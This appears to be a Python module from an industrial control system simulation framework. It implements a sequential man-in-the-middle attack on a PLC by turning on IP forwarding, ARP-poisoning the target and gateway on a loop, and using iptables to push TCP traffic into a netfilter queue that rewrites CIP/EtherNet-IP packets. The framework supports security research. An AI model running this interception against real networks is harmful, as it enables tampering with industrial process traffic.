import argparse
import os
from pathlib import Path
import _thread
import time

from wacsim.network_attacks.utilities import launch_arp_poison, restore_arp, get_mac, spoof_arp_cache
from wacsim.network_attacks.synced_attack import SyncedAttack

import subprocess
import sys
import signal
import json


class Error(Exception):
    """Base class for exceptions in this module."""


class DirectionError(Error):
    """Raised when the optional parameter direction does not have source or destination as value"""


class SeqMiTMAttack(SyncedAttack):
    """
    Sequential MitM attack that intercepts and modifies CIP/EtherNet-IP packets.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    ARP_POISON_PERIOD = 15
    """Period in seconds between ARP re-poisoning (for simple topology)"""

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')

        # Process object to handle nfqueue
        self.nfqueue_process = None
        self.run_thread = False
        self.mac_target_source = None
        self.mac_target_destination = None


    def setup(self):
        """
        This function start the network attack.

        It first sets up the iptables on the attacker node to capture the tcp packets coming from
        the target PLC. It also drops the icmp packets, to avoid network packets skipping the
        attacker node.

        Afterwards it launches the ARP poison, which basically tells the network that the attacker
        is the PLC, and it tells the PLC that the attacker is the router.

        Finally, it launches the thread that will examine all captured packets.
        """
        queue_number = self.intermediate_attack['queue_num']
        self._start_queue(queue_number)
        self.modify_ip_tables(True)
        # The reviewed CTown scene has an explicit Mininet-only route through
        # this namespace. Older scenarios retain their original ARP workflow.
        if "crave_masker" not in self.intermediate_attack:
            self.launch_mitm(get_macs=True)

        # In simple topology, start periodic re-poisoning thread to keep ARP cache spoofed
        if ("crave_masker" not in self.intermediate_attack
                and self.intermediate_yaml['network_topology_type'] == "simple"):
            self.run_thread = True
            _thread.start_new_thread(self.refresh_poison, (self.ARP_POISON_PERIOD, self.ARP_POISON_PERIOD))

        self.logger.debug(f"MITM Attack ARP Poison between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

    def _start_queue(self, queue_number):
        """Bind before ARP/iptables reroute, avoiding a startup packet drop."""
        nfqueue_path = Path(__file__).parent.absolute() / "Seq_mitm_netfilter_queue.py"
        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path),
               str(self.yaml_index), str(queue_number)]
        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)
        config = self.intermediate_attack.get("crave_masker", {})
        ready = Path(config.get("ready_file", Path(self.intermediate_yaml["output_path"])
                                           / f"sequential_mitm_{self.intermediate_attack['name']}.ready.json"))
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            if ready.is_file():
                received = json.loads(ready.read_text())
                if (received.get("execution_id") == config.get("execution_id")
                        and received.get("name") == self.intermediate_attack["name"]):
                    return
            if self.nfqueue_process.poll() is not None:
                raise RuntimeError("sequential MITM queue exited before readiness")
            time.sleep(.05)
        raise RuntimeError("sequential MITM queue did not bind within 10 seconds")

    def attack_flag_for_clock(self, run: bool) -> bool:
        """The queue is passive during warm-up; the flag denotes an actual edit."""
        config = self.intermediate_attack.get("crave_masker")
        if not config:
            return run
        return run and self.get_master_clock() >= config["spec"]["start_step"]

    def refresh_poison(self, period, delay):
        """Periodically re-poison ARP caches to maintain interception in simple topology."""
        time.sleep(delay)
        while self.run_thread:
            self.launch_mitm(get_macs=False)
            time.sleep(period)

    def launch_mitm(self, get_macs=False):
        """Send ARP spoofing packets to intercept traffic."""
        if self.intermediate_yaml['network_topology_type'] == "simple":
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    if get_macs:
                        self.mac_target_source = get_mac(self.target_plc_ip)
                        self.mac_target_destination = get_mac(plc['local_ip'])

                    spoof_arp_cache(self.target_plc_ip, self.mac_target_source, plc['local_ip'])
                    spoof_arp_cache(plc['local_ip'], self.mac_target_destination, self.target_plc_ip)
        else:
            if get_macs:
                self.mac_target_source = get_mac(self.target_plc_ip)
                self.mac_target_destination = get_mac(self.intermediate_attack['gateway_ip'])

            spoof_arp_cache(self.target_plc_ip, self.mac_target_source, self.intermediate_attack['gateway_ip'])
            spoof_arp_cache(self.intermediate_attack['gateway_ip'], self.mac_target_destination, self.target_plc_ip)

        # Always poison target <-> gateway
        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])

    def interrupt(self):
        """
        This function will be called when we want to stop the attacker. It calls the teardown
        function if the attacker is in state 1 (running)
        """
        if self.state == 1:
            self.teardown()

    def teardown(self):
        """
        This function will undo the actions done by the setup function.

        It first restores the arp poison, to point to the original router and PLC again. Afterwards
        it will delete the iptable rules and stop the thread.
        """
        self.run_thread = False
        if "crave_masker" not in self.intermediate_attack:
            restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        if ("crave_masker" not in self.intermediate_attack
                and self.intermediate_yaml['network_topology_type'] == "simple"):
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    restore_arp(self.target_plc_ip, plc['local_ip'])

        self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        self.modify_ip_tables(False)
        self.logger.debug(f"Restored ARP")

        self.logger.debug("Stopping nfqueue subprocess...")
        if self.nfqueue_process is None:
            return
        self.nfqueue_process.send_signal(signal.SIGINT)
        self.nfqueue_process.wait(timeout=10)
        if self.nfqueue_process.poll() is None:
            self.nfqueue_process.terminate()
        if self.nfqueue_process.poll() is None:
            self.nfqueue_process.kill()

    def attack_step(self):
        """Polls the NetFilterQueue subprocess and sends a signal to stop it when teardown is called"""
        pass


    def modify_ip_tables(self, append=True):
        queue_number = self.intermediate_attack['queue_num']
        if append:
            os.system(f'iptables -w -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num {queue_number}')

            os.system('iptables -w -A FORWARD -p icmp -j DROP')
            os.system('iptables -w -A INPUT -p icmp -j DROP')
            os.system('iptables -w -A OUTPUT -p icmp -j DROP')
        else:
            # Fix: delete from PREROUTING (where it was added), not INPUT/FORWARD
            os.system(f'iptables -w -t mangle -D PREROUTING -p tcp -j NFQUEUE --queue-num {queue_number}')

            os.system('iptables -w -D FORWARD -p icmp -j DROP')
            os.system('iptables -w -D INPUT -p icmp -j DROP')
            os.system('iptables -w -D OUTPUT -p icmp -j DROP')

def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = SeqMiTMAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
